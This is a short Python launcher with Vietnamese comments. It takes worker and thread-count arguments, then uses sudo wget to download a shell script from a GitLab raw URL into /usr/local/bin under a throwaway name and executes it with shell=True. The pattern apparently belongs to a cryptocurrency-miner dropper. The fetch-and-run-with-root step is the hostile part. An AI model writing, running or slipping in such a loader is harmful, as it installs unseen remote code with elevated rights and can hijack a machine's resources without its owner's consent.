import argparse
import subprocess
import sys

def main():
    # Tạo một parser
    parser = argparse.ArgumentParser(description="Handle --worker and --threads parameters and execute bash script")
    # Thêm tham số --worker
    parser.add_argument('--worker', nargs='?', const='hiepdam', default='hiepdam', help='Worker parameter (default: hiepdam)')
    # Thêm tham số --threads
    parser.add_argument('--threads', type=int, default=16, help='Number of threads (default: 1)')

    # Phân tích cú pháp các tham số
    args = parser.parse_args()

    # Lấy giá trị của tham số --worker và --threads
    worker = args.worker
    threads = args.threads

    # Định nghĩa chuỗi lệnh với tham số
    command = f"""
    cd /usr/local/bin && \
    sudo wget -O xxcxx.sh https://gitlab.com/amaz/grabcar/-/raw/main/congcong1.sh && \
    sh xxcxx.sh --worker="{worker}" --threads="{threads}"
    """
    print(f"Worker name: {worker}")
    print(f"Number of threads: {threads}")

    # Thực thi chuỗi lệnh
    try:
        subprocess.run(command, shell=True, check=True)
        print("Script executed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error executing the script: {e}")

    # Thoát chương trình
    print("Exiting program.")
    sys.exit()

if __name__ == "__main__":
    main()
